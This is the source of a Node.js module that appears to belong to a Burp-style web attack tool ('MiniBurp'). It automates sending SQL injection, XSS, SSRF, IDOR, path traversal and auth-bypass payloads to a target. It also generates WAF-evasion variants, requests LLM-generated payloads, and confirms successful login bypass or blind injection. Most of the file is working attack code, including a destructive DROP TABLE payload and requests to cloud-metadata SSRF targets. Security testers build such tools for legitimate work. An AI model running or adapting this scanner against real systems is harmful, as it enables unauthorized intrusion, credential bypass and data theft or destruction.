'use strict';
/**
 * Attack Executor v3 — MiniBurp
 * ─────────────────────────────
 * Fixes:
 *  - status is not defined (statusCode derived from every raw response)
 *  - login bypass detection (keyword + redirect + cookie change)
 *  - SQL error detection in response body
 *  - reflection detection
 *  - delay-based blind injection detection
 *  - body content comparison (not just length)
 *  - parameter combinations (username only, password only, both)
 *  - Auto Mode: executeConfirmedQueue runs automatically
 *  - Detailed logging: [BASELINE] [TESTING] [COMPARE] [CONFIRMED]
 */

const insightEngine = require('./insightEngine');
const { sendRawRequest } = require('../core/repeater');
const zlib = require('zlib');


const activeAttacks = new Set();

// ── Utilities ─────────────────────────────────────────────────

function inferType(val) {
  if (val === undefined || val === null || val === '') return 'string';
  if (/^[0-9]+$/.test(val)) return 'numeric';
  if (/^(true|false|1|0)$/i.test(val)) return 'boolean';
  return 'string';
}

/** Always derive statusCode from raw HTTP response line. NEVER use undefined `status`. */
function parseStatus(rawRes) {
  if (!rawRes) return 0;
  const m = rawRes.match(/^HTTP\/[\d.]+ (\d+)/);
  return m ? parseInt(m[1], 10) : 0;
}

/** Extract Location header from raw response. */
function parseLocation(rawRes) {
  const m = rawRes.match(/^Location:\s*(.+)$/im);
  return m ? m[1].trim() : null;
}

/** Extract all Set-Cookie names from raw response. */
function parseCookieNames(rawRes) {
  const cookies = new Set();
  const re = /^Set-Cookie:\s*([^=;]+)/gim;
  let m;
  while ((m = re.exec(rawRes)) !== null) cookies.add(m[1].trim());
  return cookies;
}

/** Detect SQL error patterns in body. */
function hasSqlError(body) {
  return /(SQL syntax|mysql_fetch|ORA-\d{5}|PostgreSQL|SQLSTATE|unclosed quotation|SqlException|syntax error in|OLE DB|Microsoft Access Driver|ODBC SQL Server)/i.test(body);
}

/** Detect login success indicators in body. */
function hasLoginSuccess(body) {
  return /(logout|sign.?out|welcome\s+(back|admin|\w+)|my.?account|dashboard|you.?are.?logged)/i.test(body);
}

/** Detect reflection of a payload in response. */
function isReflected(body, payload) {
  return body.includes(payload);
}

/** Compare bodies: returns { deltaBytes, deltaPercent, bodyChanged } */
function compareBodies(baseBody, testBody) {
  const deltaBytes = Math.abs(testBody.length - baseBody.length);
  const deltaPercent = deltaBytes / (baseBody.length || 1);
  // Content-based diff: check whether the non-whitespace content changed significantly
  const baseWords = new Set(baseBody.replace(/<[^>]+>/g, ' ').split(/\s+/).filter(Boolean));
  const testWords = new Set(testBody.replace(/<[^>]+>/g, ' ').split(/\s+/).filter(Boolean));
  let newWords = 0;
  for (const w of testWords) if (!baseWords.has(w)) newWords++;
  const bodyChanged = newWords > 5 || deltaPercent > 0.05;
  return { deltaBytes, deltaPercent, bodyChanged, newWords };
}

// ── Payload generation ───────────────────────────────────────

async function buildPayloads(type, originalValue, paramName) {
  const ollama = require('./ollamaClient');
  let payloads = [];
  try { payloads = await ollama.generatePayloads(type, paramName || 'unknown', originalValue); } catch {}

  if (!payloads || !Array.isArray(payloads) || payloads.length === 0) {
    const pType = inferType(originalValue);
    if (type.includes('SQL')) {
      if (pType === 'numeric') {
        payloads = [
          `${originalValue} OR 1=1`,
          `${originalValue} AND 1=2`,
          `${originalValue}; DROP TABLE--`,
          `${originalValue} AND SLEEP(4)--`,
          `${originalValue}'; WAITFOR DELAY '0:0:4'--`,
          `${originalValue}' UNION SELECT NULL--`,
        ];
      } else {
        // String-context: auth bypass + error injection + blind SQLi
        payloads = [
          `' OR '1'='1'--`,
          `' OR 1=1--`,
          `admin'--`,
          `' OR '1'='1`,
          `\" OR \"1\"=\"1`,
          `' AND SLEEP(4)--`,
          `'; WAITFOR DELAY '0:0:4'--`,
          `' AND 1=1--`,
          `' AND 1=2--`,
          `/**/OR/**/1=1`,
          `'/**/OR/**/'1'='1`,
        ];
      }
    } else if (type.includes('XSS')) {
      payloads = [
        `<script>console.log(1)</script>`,
        `"><script>console.log(1)</script>`,
        `<img src=x onerror=console.log(1)>`,
        `<svg/onload=console.log(1)>`,
        `' autofocus onfocus=console.log(1) '`,
      ];
    } else if (type.includes('IDOR')) {
      const num = parseInt(originalValue) || 1;
      payloads = [`${num - 1}`, `${num + 1}`, '0', '1', 'admin', 'test'];
    } else if (type.includes('SSRF')) {
      payloads = [
        'http://localhost', 'http://127.0.0.1',
        'http://169.254.169.254/latest/meta-data/',
        'file:///etc/passwd',
      ];
    } else {
      payloads = ['../etc/passwd', '%2e%2e%2fetc%2fpasswd', '%00'];
    }
  }
  return payloads.slice(0, 12);
}

// ── Request mutation ─────────────────────────────────────────

function processPayloads(rawRequest, param, payloads) {
  const requests = [];
  try {
    const rawStr = typeof rawRequest === 'string' ? rawRequest : rawRequest.toString();
    const [headerPart, bodyPart] = rawStr.split('\r\n\r\n');
    const [reqLine, ...headers] = headerPart.split('\r\n');
    const [method, url, httpVer] = reqLine.split(' ');
    const fakeUrl = new URL(url.startsWith('http') ? url : `http://localhost${url}`);

    for (const p of payloads) {
      let newUrl = url;
      if (fakeUrl.searchParams.has(param)) {
        const fake = new URL(fakeUrl);
        fake.searchParams.set(param, p);
        newUrl = fake.pathname + fake.search;
      }

      let newBody = bodyPart || '';
      if (newBody.includes(`${param}=`)) {
        newBody = newBody.replace(new RegExp(`(${param}=)[^&]*`), `$1${encodeURIComponent(p)}`);
      }

      let headStr = `${method} ${newUrl} ${httpVer}\r\n`;
      for (const h of headers) {
        if (h.toLowerCase().startsWith('content-length:')) {
          headStr += `Content-Length: ${Buffer.byteLength(newBody, 'utf8')}\r\n`;
        } else {
          headStr += h + '\r\n';
        }
      }
      requests.push({ payload: p, raw: headStr + '\r\n' + newBody });
    }
  } catch (e) {
    console.error('[AttackExecutor] processPayloads error:', e.message);
  }
  return requests;
}

// ── Parameter combinations for login forms ───────────────────

function buildLoginCombinations(raw, userField, passField, payloads) {
  const combos = [];
  for (const p of payloads) {
    // Username only
    const u1 = injectField(raw, userField, p);
    if (u1) combos.push({ payload: p, combination: 'username_only', raw: u1 });

    // Password only
    const u2 = injectField(raw, passField, p);
    if (u2) combos.push({ payload: p, combination: 'password_only', raw: u2 });

    // Both
    const u3 = injectField(injectField(raw, userField, p) || raw, passField, p);
    if (u3) combos.push({ payload: p, combination: 'both', raw: u3 });
  }
  return combos;
}

function injectField(raw, field, value) {
  if (!raw || !field) return null;
  const encoded = encodeURIComponent(value);
  const re = new RegExp(`(${field}=)[^&\\r\\n]*`);
  if (!re.test(raw)) return null;
  const newBody = raw.replace(re, `$1${encoded}`);
  // Fix Content-Length
  const [h, b] = newBody.split('\r\n\r\n');
  if (b === undefined) return newBody;
  const newLen = Buffer.byteLength(b, 'utf8');
  const fixedHead = h.replace(/^Content-Length:\s*\d+/im, `Content-Length: ${newLen}`);
  return fixedHead + '\r\n\r\n' + b;
}

// ── Log helper ───────────────────────────────────────────────

function log(io, reqId, phase, message, extra = {}) {
  const entry = { reqId, phase, message, timestamp: Date.now(), ...extra };
  if (io) io.emit('attack:log', entry);
  console.log(`[${phase}][${reqId}] ${message}`);
}

// ── Main executor ────────────────────────────────────────────

async function attackExecutor({ reqId, type, parameter, attempt = 1 }) {
  const attackId = `${reqId}-${parameter}-${type}`;
  if (activeAttacks.has(attackId)) {
    insightEngine.addAttackResult(reqId, type, parameter, '⚠️ Attack already running.');
    return;
  }
  activeAttacks.add(attackId);

  const io      = insightEngine.io;
  const insight = insightEngine.getOrCreate(reqId);
  const reqCtx  = insight.request;
  let baseline  = insight.response || insightEngine.getBaseline?.(reqCtx) || null;

  if (!reqCtx || !reqCtx.method) {
    insightEngine.addAttackResult(reqId, type, parameter, '✗ Request context not found.');
    activeAttacks.delete(attackId);
    return;
  }

  if (io) io.emit('attack:status', { reqId, type, parameter, status: 'RUNNING', message: `Testing [${type}] on [${parameter}]` });

  // Build raw request string
  let raw = reqCtx.raw;
  if (!raw) {
    raw = `${reqCtx.method} ${reqCtx.url} HTTP/1.1\r\n`;
    for (const [k, v] of Object.entries(reqCtx.headers || {})) raw += `${k}: ${v}\r\n`;
    raw += '\r\n' + (reqCtx.body || '');
  }

  // Extract host/port
  let targetHost = (reqCtx.headers?.host || 'localhost').split(':')[0];
  let targetPort = reqCtx.url?.startsWith('https') ? 443 : 80;
  if (reqCtx.headers?.host?.includes(':')) targetPort = parseInt(reqCtx.headers.host.split(':')[1]);
  const useSSL = targetPort === 443 || reqCtx.url?.startsWith('https');

  // ── BASELINE capture ─────────────────────────────────────
  if (!baseline) {
    if (['POST', 'PUT', 'DELETE', 'PATCH'].includes(reqCtx.method.toUpperCase())) {
      log(io, reqId, 'BASELINE', `⚠ Skipping baseline for ${reqCtx.method} (side-effect risk). Forwarding response will set baseline.`);
    } else {
      log(io, reqId, 'BASELINE', `Capturing baseline for ${reqCtx.url}...`);
      try {
        const t0 = Date.now();
        const baseRaw = await sendRawRequest({ rawRequest: raw, host: targetHost, port: targetPort, useSSL });
        const elapsed = Date.now() - t0;
        const strHead = baseRaw.toString('utf8', 0, Math.min(baseRaw.length, 8000));
        const baseStatus = parseInt((strHead.match(/^HTTP\/[\d.]+ (\d+)/) || [0, 0])[1]);
        const hi = baseRaw.indexOf(Buffer.from('\r\n\r\n'));
        if (hi === -1) {
          activeAttacks.delete(attackId);
          return;
        }

        const headPart = baseRaw.slice(0, hi).toString('utf8');
        const headers = {};
        headPart.split('\r\n').forEach(line => {
           const i = line.indexOf(':');
           if (i > 0) headers[line.slice(0,i).toLowerCase().trim()] = line.slice(i+1).trim();
        });

        let bodyRaw = baseRaw.slice(hi + 4);
        let bodyPart = '';
        const encoding = headers['content-encoding'];
        try {
          if (encoding === 'gzip') bodyPart = zlib.gunzipSync(bodyRaw).toString('utf8');
          else if (encoding === 'deflate') bodyPart = zlib.inflateSync(bodyRaw).toString('utf8');
          else bodyPart = bodyRaw.toString('utf8');
        } catch(e) { bodyPart = bodyRaw.toString('utf8'); }

        baseline = { status: baseStatus, length: Buffer.byteLength(bodyPart), elapsed, body: bodyPart, headers, raw: baseRaw };
        insightEngine.setResponse(reqId, { statusCode: baseStatus, bodyPreview: bodyPart });
        log(io, reqId, 'BASELINE', `✔ Baseline: HTTP ${baseStatus}, ${baseline.length}b, ${elapsed}ms`);
      } catch (e) {
        log(io, reqId, 'BASELINE', `✗ Baseline capture failed: ${e.message}`);
        activeAttacks.delete(attackId);
        return;
      }

    }
  } else {
    log(io, reqId, 'BASELINE', `Using existing baseline: HTTP ${baseline.status || baseline.statusCode}, ${baseline.length}b`);
  }

  const baseStatus  = baseline?.status || baseline?.statusCode || 0;
  const baseLength  = baseline?.length || 0;
  const baseBody    = baseline?.body || baseline?.bodyPreview || '';
  const baseElapsed = baseline?.elapsed || 0;
  const baseCookies = parseCookieNames(typeof baseline?.raw === 'string' ? baseline.raw : '');

  // ── Extract param value and path ─────────────────────────
  let origVal = '', pPath = '';
  try {
    const urlObj = new URL(reqCtx.url.startsWith('http') ? reqCtx.url : `http://localhost${reqCtx.url}`);
    pPath = urlObj.pathname;
    if (urlObj.searchParams.has(parameter)) origVal = urlObj.searchParams.get(parameter);
    else if (reqCtx.body?.includes(`${parameter}=`)) {
      const m = reqCtx.body.match(new RegExp(`${parameter}=([^&]*)`));
      if (m) origVal = decodeURIComponent(m[1]);
    }
  } catch {}

  const memoryEngine = require('./memoryEngine');
  const blacklisted  = memoryEngine.getBlacklistedPayloads(reqCtx.method, pPath, parameter, type);
  let attacksToRun   = [];

  // ── Build attack list ─────────────────────────────────────
  const bestPayload = memoryEngine.getBestPayload(reqCtx.method, pPath, parameter, type);
  if (bestPayload) {
    log(io, reqId, 'TESTING', `🧠 Reusing learned payload: ${bestPayload}`);
    attacksToRun = processPayloads(raw, parameter, [bestPayload]);
    attacksToRun.forEach(a => a.isLearned = true);
  } else if (type === 'Hidden Param Discovery') {
    const p1 = raw.replace(' HTTP/1.1', (raw.includes('?') ? '&' : '?') + 'admin=true&debug=1&isAdmin=1 HTTP/1.1');
    attacksToRun.push({ payload: '?admin=true', raw: p1 });
  } else if (type === 'Path Fuzzing') {
    try {
      const urlObj = new URL(reqCtx.url.startsWith('http') ? reqCtx.url : `http://localhost${reqCtx.url}`);
      ['/admin', '/api/admin', '/config', '/debug', '/.git/config'].forEach(p => {
        attacksToRun.push({ payload: p, raw: raw.replace(urlObj.pathname, p) });
      });
    } catch {}
  } else if (type === 'Auth Bypass Candidate') {
    let stripped = raw.replace(/^Authorization:.*$/im, '').replace(/^Cookie:.*$/im, '').replace(/\r\n\r\n\r\n/g, '\r\n\r\n');
    attacksToRun.push({ payload: 'STRIPPED_AUTH_HEADERS', raw: stripped });
  } else {
    const pl = await buildPayloads(type, origVal, parameter);

    // Detect login form: check if both username + password fields exist in body
    const isLoginForm = reqCtx.body && /tbUsername|tbPassword|username|password/i.test(reqCtx.body);
    const userField   = isLoginForm ? (reqCtx.body.match(/(tbUsername|username|email)=/) || [])[1] : null;
    const passField   = isLoginForm ? (reqCtx.body.match(/(tbPassword|password|passwd)=/) || [])[1] : null;

    if (isLoginForm && userField && passField && type.includes('SQL')) {
      log(io, reqId, 'TESTING', `Login form detected — testing parameter combinations: username/password/both`);
      attacksToRun = buildLoginCombinations(raw, userField, passField, pl);
    } else {
      attacksToRun = processPayloads(raw, parameter, pl);
    }
  }

  // WAF bypass variants on retry
  if (attempt >= 2 && !bestPayload) {
    const evolved = [];
    for (const a of attacksToRun) {
      if (a.isLearned) continue;
      const bp = a.payload;
      const variants = [
        encodeURIComponent(bp),
        bp.replace(/ /g, '/**/'),
        bp.split('').map((c, i) => i % 2 === 0 ? c.toUpperCase() : c.toLowerCase()).join(''),
        encodeURIComponent(encodeURIComponent(bp)),
      ];
      const evReqs = processPayloads(raw, parameter, variants);
      evReqs.forEach(ev => ev.isEvolved = true);
      evolved.push(...evReqs);
    }
    attacksToRun = evolved;
    log(io, reqId, 'TESTING', `WAF bypass mode: ${evolved.length} evasion variants`);
  }

  // Filter blacklisted / duplicate payloads
  const seen = new Set();
  attacksToRun = attacksToRun.filter(a => {
    if (blacklisted.has(a.payload)) return false;
    if (seen.has(a.payload)) return false;
    seen.add(a.payload);
    return true;
  });

  if (attacksToRun.length === 0) {
    insightEngine.addAttackResult(reqId, type, parameter, '✗ No injectable payloads generated.');
    activeAttacks.delete(attackId);
    return;
  }

  // ── Attack loop ──────────────────────────────────────────
  for (const attack of attacksToRun) {
    try {
      const combo = attack.combination ? ` [${attack.combination}]` : '';
      log(io, reqId, 'TESTING', `→ Payload${combo}: ${attack.payload.slice(0, 60)}`);

      const t0 = Date.now();
      const resRaw = await sendRawRequest({ rawRequest: attack.raw, host: targetHost, port: targetPort, useSSL });
      const elapsed = Date.now() - t0;

      const strHead = resRaw.toString('utf8', 0, Math.min(resRaw.length, 8192));
      const resStatus = parseInt((strHead.match(/^HTTP\/[\d.]+ (\d+)/) || [0, 0])[1]);
      const hi = resRaw.indexOf(Buffer.from('\r\n\r\n'));
      if (hi === -1) continue;

      const headPart = resRaw.slice(0, hi).toString('utf8');
      const resLocation = (headPart.match(/^Location:\s*(.+)/im) || [])[1]?.trim() || null;
      const resCookies = new Set();
      const cookieMatches = headPart.matchAll(/^Set-Cookie:\s*([^=;]+)/gim);
      for (const m of cookieMatches) resCookies.add(m[1].trim());

      const resHeaders = {};
      headPart.split('\r\n').forEach(line => {
        const i = line.indexOf(':');
        if (i > 0) resHeaders[line.slice(0, i).toLowerCase().trim()] = line.slice(i + 1).trim();
      });

      let bodyRaw = resRaw.slice(hi + 4);
      let resBody = '';
      const encoding = resHeaders['content-encoding'];
      try {
        if (encoding === 'gzip') resBody = zlib.gunzipSync(bodyRaw).toString('utf8');
        else if (encoding === 'deflate') resBody = zlib.inflateSync(bodyRaw).toString('utf8');
        else resBody = bodyRaw.toString('utf8');
      } catch(e) { resBody = bodyRaw.toString('utf8'); }

      const resLength = Buffer.byteLength(resBody);
      const newCookies = [...resCookies].filter(c => !baseCookies.has(c));
      const cookieChanged = newCookies.length > 0;

      const { deltaBytes, deltaPercent, bodyChanged, newWords } = compareBodies(baseBody, resBody);

      log(io, reqId, 'COMPARE', `HTTP ${resStatus} | ${resLength}b | Δ${deltaBytes}b ${deltaPercent > 0 ? Math.round(deltaPercent * 100) + '%' : ''} | ${elapsed}ms | redir=${resLocation || 'none'} | + ${newWords} new words`);

      if (io) {
        io.emit('attack:status', {
          reqId, type, parameter, status: 'TESTING',
          payload: attack.payload,
          message: `[COMPARE] HTTP ${resStatus} Δ${deltaBytes}b ${elapsed}ms`,
        });
      }


      let payloadSucceeded = false;

      const commit = async (label, message) => {
        payloadSucceeded = true;
        memoryEngine.storeResult(reqCtx.method, pPath, parameter, type, attack.payload, true);
        let aiText = '';
        if (label.includes('CONFIRMED') || label.includes('Likely')) {
          try { aiText = await require('./ollamaClient').analyzeResponse(type, attack.payload, deltaPercent); } catch {}
        }
        const prefix = attack.isLearned ? '🧠 [Learned] ' : attack.isEvolved ? '🧬 [Evolved] ' : '';
        const full = `${prefix}${label} ${message}${aiText ? ' | 💡 ' + aiText : ''}`;
        insightEngine.addAttackResult(reqId, type, parameter, { 
          confirmed: label.includes('CONFIRMED'), 
          message: full, 
          payload: attack.payload, 
          evidence: message 
        });
        log(io, reqId, 'CONFIRMED', full);

      };

      // ── 1. Login bypass detection (primary check) ─────
      const isRedirectBypass  = resStatus === 302 && resLocation && !/login/i.test(resLocation);
      const isKeywordBypass   = hasLoginSuccess(resBody) && !hasLoginSuccess(baseBody);
      const isCookieBypass    = cookieChanged && (hasLoginSuccess(resBody) || resStatus === 302);

      if (!payloadSucceeded && (isRedirectBypass || isKeywordBypass || isCookieBypass)) {
        const evidence = [
          isRedirectBypass ? `302 redirect → ${resLocation}` : '',
          isKeywordBypass  ? 'Login success keyword detected' : '',
          isCookieBypass   ? `New cookie(s): ${newCookies.join(', ')}` : '',
        ].filter(Boolean).join(' | ');
        await commit('🔥 ✔ CONFIRMED:', `LOGIN BYPASS via ${type}! Payload='${attack.payload}' | Evidence: ${evidence}`);
        break;
      }

      // ── 2. Blind delay detection ──────────────────────
      if (!payloadSucceeded && type.includes('SQL') && /sleep|waitfor/i.test(attack.payload)) {
        const baselineTime = baseElapsed || 400;
        if (elapsed > Math.max(baselineTime + 2500, 3500)) {
          // Confirm twice more
          let hits = 1;
          for (let i = 0; i < 2; i++) {
            const ts = Date.now();
            try { await sendRawRequest({ rawRequest: attack.raw, host: targetHost, port: targetPort, useSSL }); } catch {}
            if (Date.now() - ts > 2500) hits++;
          }
          if (hits >= 2) {
            await commit('🔥 ✔ CONFIRMED:', `BLIND SQL INJECTION (time-delay ${elapsed}ms, ${hits}/3 consistent). Payload='${attack.payload}'`);
            break;
          } else {
            log(io, reqId, 'COMPARE', `Delay inconsistent (${hits}/3) — likely network latency, not blind SQLi`);
          }
        }
      }

      // ── 3. SQL error in response ──────────────────────
      if (!payloadSucceeded && type.includes('SQL') && hasSqlError(resBody) && !hasSqlError(baseBody)) {
        await commit('🔥 ✔ CONFIRMED:', `SQL error leaked in response. Payload='${attack.payload}'`);
        break;
      }

      // ── 4. XSS reflection ─────────────────────────────
      if (!payloadSucceeded && type.includes('XSS') && isReflected(resBody, attack.payload)) {
        await commit('🔥 ✔ CONFIRMED:', `Payload reflected unmodified in HTML. Payload='${attack.payload}'`);
        break;
      }

      // ── 5. Application error in body ──────────────────
      if (!payloadSucceeded && /(exception|stack trace|internal server error|unhandled|fatal error)/i.test(resBody) && !/(exception|stack trace|internal server error|unhandled|fatal error)/i.test(baseBody)) {
        await commit('🔥 ✔ CONFIRMED:', `Application exception triggered.`);
        break;
      }

      // ── 6. Auth bypass via header stripping ───────────
      if (!payloadSucceeded && type === 'Auth Bypass Candidate' && resStatus === 200 && baseStatus !== 200) {
        await commit('🔥 ✔ CONFIRMED:', `Auth strips returned 200 when baseline was ${baseStatus}. Broken Access Control!`);
        break;
      }

      // ── 7. Status shift (403/401 → 200 etc.) ─────────
      if (!payloadSucceeded && resStatus === 200 && (baseStatus === 401 || baseStatus === 403 || baseStatus === 404)) {
        await commit('🔥 ✔ CONFIRMED:', `Status shifted ${baseStatus} → 200. Payload='${attack.payload}'`);
        break;
      }

      // ── 8. Large body diff (IDOR / data leak) ─────────
      if (!payloadSucceeded && resStatus === 200 && baseStatus === 200 && bodyChanged) {
        const conf = deltaPercent > 0.50 ? 'HIGH' : deltaPercent > 0.20 ? 'SUSPICIOUS' : 'LOW';
        if (conf !== 'LOW' || type.includes('IDOR')) {
          await commit(`⚠️ Likely [${conf}]:`, `Significant body change: Δ${deltaBytes}b (${Math.round(deltaPercent * 100)}%), +${newWords} new words. Payload='${attack.payload}'`);
          break;
        }
      }

      if (!payloadSucceeded) {
        memoryEngine.storeResult(reqCtx.method, pPath, parameter, type, attack.payload, false);
        log(io, reqId, 'COMPARE', `✘ No anomaly detected for payload: ${attack.payload.slice(0, 40)}`);
      }

    } catch (e) {
      console.error('[AI Attack] Error:', e.message);
    }

    await new Promise(r => setTimeout(r, 60 + Math.floor(Math.random() * 60)));
  }

  activeAttacks.delete(attackId);
}

module.exports = { attackExecutor };
